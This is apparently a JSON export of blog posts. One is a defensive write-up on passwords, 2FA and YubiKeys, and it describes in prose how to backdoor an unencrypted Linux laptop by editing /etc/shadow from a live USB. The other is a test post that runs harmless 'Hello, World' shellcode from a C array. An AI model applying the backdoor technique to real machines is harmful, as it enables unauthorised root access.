attacker, even with these tools, should not be able to get into our accounts. If an account or password has been compromised, our data and accounts on other services should still be protected.\nPhysical threat model This is the situation where an attacker has physical access to a device (i.e. an evil maid attack). For now, the way I think about this scenario is that an attacker can have physical access to one of the following:\nPhone Laptop YubiKey Even with any one of these devices in their possession, the adversary should never be able to access any of our data or accounts. Additionally, we should not be locked out of our own accounts even with one device missing.\nAddressing the remote threat model will be the subject of this post, whereas the physical threat model will be addressed in part two.\nBaseline setup Hardware For this post, I\u0026rsquo;ll be using the following hardware:\nLaptop: Lenovo ThinkPad X1 Carbon Gen 9 Phone: Apple iPhone 13 Pro Max Hardware security key: YubiKey 5C NFC Security misconfigurations This is the fun part: detailing a number of missteps I\u0026rsquo;ve made with security in the name of convenience over the last several years.\nPassword generation. My previous password generation algorithm was something I came up when I was much younger and dumber This scheme was likely brute-forceable by a determined adversary, and in addition if my password on one insecure site got leaked, it would also compromise all of my other account passwords. Inconsistent use of two-factor authentication. It took me an embarassingly long time to add 2FA to my password manager, Bitwarden. Yet my Epic Games account had 2FA on \u0026ndash; and I\u0026rsquo;m not even that much of a gamer. Leaving my laptop hard drive unencrypted. Given physical access to an unencrypted laptop, an evil maid attack is extremely easy. A trivial example is to boot a live USB, mount the Linux root partition, and edit /etc/passwd and /etc/shadow to give yourself a backdoored user with root privileges. Fully preventing an evil maid attack is difficult on Linux, as will be detailed later in this post, but it\u0026rsquo;s not an excuse to have an unencrypted disk! Stage one: fixing bad passwords The interesting bit here is generating a random secure password that\u0026rsquo;s also reasonably fast to type (if not memorable). I use hsxkpasswd on my laptop, which generates a random XKCD-style password with additional digit and special-character padding. A convenience script to do the generation is as follows:\n~ » cat /usr/local/bin/genpwd #!/bin/bash hsxkpasswd -c ~/.hsxkpasswdrc 2\u0026gt;/dev/null | xclip -r -selection c This script generates a password using the JSON configuration file found at ~/.hsxkpasswdrc and immediately copies it into the clipboard for easy pasting. You can generate a configuration file with the format you want at xkpasswd.\nOn my phone, I use gjPwd, which is essentially a hsxkpasswd frontend for iOS.\nActually resetting the passwords is a simple, though tedious, game of whack-a-mole. Every time I logged into a service with a password generated using the old algorithm, I would immediately reset the password.\nI started with banks, and then moved onto other services that stored financial information. This led to my Twitter rant about airlines\u0026rsquo; poor digital security policies.\nStage two: consistently using 2FA At this point, there\u0026rsquo;s no excuse to not use 2FA when a site offers it. This is especially true for anything that has access to financial information such as banks or credit card issuers.\nWhy FIDO2/WebAuthn 2FA is the way to go My strong preference for 2FA is to use the YubiKey to do FIDO2/WebAuthn-based 2FA.\nWhy this instead of SMS-based or authenticator/TOTP app-based 2FA? SMS-based 2FA puts you at risk of your OTP code being stolen through a SIM-swapping attack. Using an authenticator app such as Authy is better, but still leaves you vulnerable to a phishing attack that requests your login information and your TOTP code, and then passes the details along to the actual service to log in as you. It is up to you to scrutinize the website you\u0026rsquo;ve navigated to and make sure it\u0026rsquo;s not fraudulent. Using a YubiKey will prevent both these attacks, because the key will simply refuse to authenticate if the domain doesn\u0026rsquo;t match the profile saved in the hardware. Unfortunately, the list of services supporting hardware security key-based authentication is mostly limited to big tech companies and security-focused products. For these services, adding a security key is fairly easy; you just follow the prompts in the service\u0026rsquo;s security settings.\nSecuring TOTP 2FA behind a YubiKey, plus some phishing protection For everything else, most services that support any 2FA do support TOTP-based authentication, and the YubiKey can store TOTP codes for use with such services. However, the TOTP code storage is limited to only 32 codes, even on the latest models such as my YubiKey 5C NFC (2020). As more and more services start to support 2FA, 32 TOTP codes will probably not cut it long-term.\nI currently pay for Bitwarden Premium, which now allows me to select FIDO2/WebAuthn using the YubiKey as my only means of 2FA. I now rely on Bitwarden to do TOTP 2FA (which is also a Premium feature), since I can store TOTP secrets for an unlimited amount of services. This also offers some protection against phishing attacks, since Bitwarden won\u0026rsquo;t bring up the TOTP entry for a website whose domain mismatches the saved one.\nFreshly adding Bitwarden TOTP is fairly easy for most services; you just go through the prompts to set up 2FA, click on \u0026ldquo;I can\u0026rsquo;t scan the QR code\u0026rdquo;, and then paste the TOTP secret into the Bitwarden browser extension.\nMigrating from Authy, my previous TOTP provider, is a different story, since Authy doesn\u0026rsquo;t allow you to export TOTP secrets for use with a different service. Instead, you need to remove the Authy 2FA option from each service and add a new 2FA option for Bitwarden. Some websites make this extra annoying and force you to disable 2FA altogether and re-enable it in order to switch TOTP providers.\nBad (and nonexistent) 2FA implementations Some services either only allow SMS-based 2FA, or force you to use SMS-based 2FA as a backup for TOTP or FIDO2/WebAuthn 2FA solutions. You\u0026rsquo;re only as secure as your weakest backup \u0026ndash; so even if SMS 2FA isn\u0026rsquo;t the primary 2FA method, as long as it exists as an option, you\u0026rsquo;re still vulnerable to a SIM-swap attack. A non-exhaustive name-and-shame list from my personal experience:\nYahoo Microsoft Uber Lyft Bank of America Barclays Credit Karma Seriously, why do the financial services \u0026ndash; those with arguably the most sensitive data at stake \u0026ndash; only allow the least secure form of 2FA?\nEven worse are services that store financial information, yet have no support for any form of 2FA. In my experience this has mostly been airline frequent flyer programs \u0026ndash; again, refer to my Twitter rant about all the security issues that airlines have.\nAs far as I know, Qantas, British Airways, and Singapore Airlines support 2FA. No US carriers do. Closing At this point, we\u0026rsquo;ve significantly decreased our attack surface for a remote adversary. Our passwords are now truly random for every service, and every service with sensitive information on it (save for airline frequent flyer accounts) has some form of 2FA on it. When TOTP 2FA is needed, it\u0026rsquo;s locked behind Bitwarden, which requires FIDO2/WebAuthn to log in.\nUnfortunately, this is not necessarily comforting when someone with physical access to your laptop can simply just reset your root password by booting from a USB stick, thereby gaining full compromise of your assets.\nPreventing these attacks is the focus of the next post.\n","date":"2022-05-04","permalink":"https://saligrama.io/blog/post/upgrading-personal-security-web/","tags":[],"title":"Upgrading my personal security, part one: password generation, 2FA, YubiKey"},{"content":"Hello, world! Test post for this blog.\nchar code[] = \u0026quot;\\xe9\\x1e\\x00\\x00\\x00\\xb8\u0026quot; \u0026quot;\\x04\\x00\\x00\\x00\\xbb\\x01\u0026quot; \u0026quot;\\x00\\x00\\x00\\x59\\xba\\x0f\u0026quot; \u0026quot;\\x00\\x00\\x00\\xcd\\x80\\xb8\u0026quot; \u0026quot;\\x01\\x00\\x00\\x00\\xbb\\x00\u0026quot; \u0026quot;\\x00\\x00\\x00\\xcd\\x80\\xe8\u0026quot; \u0026quot;\\xdd\\xff\\xff\\xff\\x48\\x65\u0026quot; \u0026quot;\\x6c\\x6c\\x6f\\x2c\\x20\\x57\u0026quot; \u0026quot;\\x6f\\x72\\x6c\\x64\\x21\\x0a\u0026quot;; int main(int argc, char **argv) { (*(void(*)())code)(); return 0; } ","date":"2022-05-02","permalink":"https://saligrama.io/blog/post/hello/","tags":[],"title":"Hello, world!"}]